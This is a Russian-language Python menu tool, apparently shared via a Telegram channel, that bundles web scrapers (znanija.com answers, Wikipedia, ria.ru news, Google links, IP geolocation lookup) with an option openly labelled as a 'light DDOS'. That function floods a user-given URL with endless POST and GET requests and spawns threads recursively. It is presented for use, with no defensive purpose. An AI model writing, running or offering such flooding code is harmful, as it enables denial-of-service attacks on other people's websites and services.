import requests
from bs4 import BeautifulSoup
import json
import sys
from threading import Thread

count = 0

def start():
    print('██████╗░░█████╗░██████╗░░██████╗███████╗██████╗░')
    print('██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗')
    print('██████╔╝███████║██████╔╝╚█████╗░█████╗░░██████╔╝')
    print('██╔═══╝░██╔══██║██╔══██╗░╚═══██╗██╔══╝░░██╔══██╗')
    print('██║░░░░░██║░░██║██║░░██║██████╔╝███████╗██║░░██║')
    print('╚═╝░░░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝')
    print('               @TermuxGulde - Telegram')


start()

run = True

while run:
    print('\n\n=== 1 - html Парсер ===\n=== 2 - Парсер ответа со znanija.com ===\n=== 3 - Парсер текста с википедии ===\n=== 4 - Парсер новостей ===\n=== 5 - Парсер информации об IP ===\n=== 6 - Парсер ссылок при запросе в Google ===\n=== 7 - Легкий DDOS (Маленький шанс положить сайт) ===\n=== 99 - Выход ===')
    try:
        mes = int(input('\nВыберите цифру:\n>> '))
    except:
        pass
    try:
        if mes != 3 and mes != 4 and mes != 99 and mes != 5 and mes != 6 and mes != 7:
            URL = input('\nВведите ссылку:\n>> ')
            print('\n')
    except:
        pass
    HEADERS = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36', 'accept': '*/*'}
    
    def get_html(url, params=None):
        r = requests.get(url, headers=HEADERS, params=params)
        return r

    def get_news(html):
        soup = BeautifulSoup(html, 'html.parser')
        items = soup.find_all('div', class_='cell-list__list')
        answer = []
        count = 0
        for ans in items:
            answer.append({'ans': ans.find('span', class_='cell-list__item-title').get_text()})
        print('\nНайдено ' + str(len(answer)) + ' новостей\n')
        try:
            while True:
                print(f'Новость {count + 1}: ' + str(answer[count]['ans']))
                count += 1
        except:
            print('\n\n=====================================')
            print('\nНовости взяты с сайта https://ria.ru/')
            print('\n=====================================')

    def get_content(html):
        soup = BeautifulSoup(html, 'html.parser')
        items = soup.find_all('div', class_='js-react-answers js-question-answers empty:sg-space-y-m md:empty:sg-space-y-l')
        answer = []
        count = 0
        for ans in items:
            answer.append({'ans': ans.find('div', class_='sg-text sg-text--break-words brn-rich-content js-answer-content').get_text()})
        print('\nНайдено ' + str(len(answer)) + ' ответов\n')
        try:
            while True:
                print('Ответ: ' + str(answer[count]['ans']))
                count += 1
        except:
            pass
        
    def wiki(ID):
        find = ('https://ru.wikipedia.org/api/rest_v1/page/summary/' + str(ID))
        resp = requests.get(find)
        resp = str(resp.text)
        a = json.loads(resp.replace("'",'"'))
        try:
            print('\n' + str(str(a['title'])) + '\n\n' + str(a['extract']) + '\n\n' + 'Ссылка: ' + str(a['content_urls']['desktop']['page']) + '\n\nИзображение: ')
            try:
                print(str(a['originalimage']['source']))
            except:
                print('Отсутствует')
        except Exception as err:
            print('\nВ википедии нет такой темы ' + '(' + str(err) + ')')

    def ip(ip):
        response = requests.get('https://ipinfo.io/' + ip + '/json')
        r = response.json()
        try:
            print('\n[IP] : ' + r['ip'])
        except:
            pass
        try:
            print('[Страна] : ' + r['country'])
        except:
            pass
        try:
            print('[Регион] : ' + r['region'])
        except:
            pass
        try:
            print('[Город] : ' + r['city'])
        except:
            pass
        try:
            print('[Имя устройства] : ' + r['hostname'])
        except:
            pass
        try:
            print('[Местоположение] : ' + r['loc'])
        except:
            pass
        try:
            print('[Провайдер] : ' + r['org'])
        except:
            pass
        try:
            print('[Часовой пояс] : ' + r['timezone'])
        except:
            pass
        try:
            print('[Почтовый индекс] : ' +  r['postal'])
        except:
            pass
        print('\nБольше информации нет.\n')
    def google(url):
        r = requests.get(url, HEADERS)
        soup = BeautifulSoup(r.content, 'html.parser')
        find = soup.find_all('a')
        for link in find:
            print('\nhttps://google.com' + link.get('href'))

    def ddos_(url):
        try:
            thrnom = int(input('\nКолличество потоков:\n>> '))
        except:
            print('Данные были введены неккоректно')
        while(1<10):
            spam = requests.post(url)
            spam2 = requests.get(url)
            def ddos():
                global count
                for i in range(int(thrnom)):
                    thr = Thread(target = ddos)
                    thr.start()
                    count += 1
                    print(f'\nПакет отправлен ({count})')
            ddos()

    def parse():
        if mes == 7:
            link = input('\nВведите URL:\n>> ')
            ddos_(link)
        if mes == 6:
            response = ('https://www.google.com/search?q=' + input('\nВведите запрос:\n>> '))
            google(response)
        if mes == 5:
            search = input('\nВведите айпи:\n>> ')
            ip(search)
        if mes == 99:
            run = False
            sys.exit()
        if mes == 4:
            html_ = get_html('https://ria.ru/')
            get_news(html_.text)
        if mes != 3 and mes != 4 and mes != 99 and mes != 5 and mes != 6 and mes != 7:
            html = get_html(URL)
        if mes == 1:
            print(html.text)
        if mes == 2:
            get_content(html.text)
        if mes == 3:
            try:
                id_ = input('\nПоиск в Википедии:\n>> ')
                wiki(id_)
            except:
                print('Error')

    parse()
